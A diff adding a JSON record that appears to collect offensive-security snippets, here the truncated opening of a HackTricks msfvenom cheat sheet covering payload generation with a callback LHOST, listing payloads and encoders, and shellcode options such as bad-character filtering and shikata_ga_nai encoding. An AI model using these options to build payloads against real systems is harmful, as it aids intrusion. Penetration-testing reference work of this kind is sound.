@@ -1,0 +1,27 @@
+{
+  "id": "generic_hacking_bef8d53eea77",
+  "category": "generic-hacking",
+  "title": "msfvenom",
+  "description": "# MSFVenom - CheatSheet\n\n{{#include ../../banners/hacktricks-training.md}}\n\n---\n\n## Basic msfvenom\n\n`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`\n\nOne can also use the `-a` to specify the architecture or the `--platform`\n\n## Listing\n\n```bash\nmsfvenom -l payloads #Payloads\nmsfvenom -l encoders #Encoders\n```\n\n## Common params when creating a shellcode\n\n```bash\n-b \"\\x00\\x0a\\x0d\"\n-f c\n-e x86/shikata_ga_nai -i 5\nEXITFUNC=thread\nPrependSetuid=True #Use this to create a ",
+  "payloads": [
+    "# MSFVenom - CheatSheet",
+    "{{#include ../../banners/hacktricks-training.md}}",
+    "## Basic msfvenom",
+    "`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`",
+    "One can also use the `-a` to specify the architecture or the `--platform`",
+    "## Listing",
+    "```bash",
+    "msfvenom -l payloads #Payloads",
+    "msfvenom -l encoders #Encoders",
+    "## Common params when creating a shellcode",
+    "```bash",
+    "-b \"\\x00\\x0a\\x0d\"",
+    "-e x86/shikata_ga_nai -i 5",
+    "EXITFUNC=thread",
+    "PrependSetuid=True #Use this to create a shellcode that will execute something with SUID"
+  ],
+  "source": "HackTricks",
+  "references": [
+    "/workspaces/hunter-skill/hacktricks/src/generic-hacking/reverse-shells/msfvenom.md"
+  ]
+}
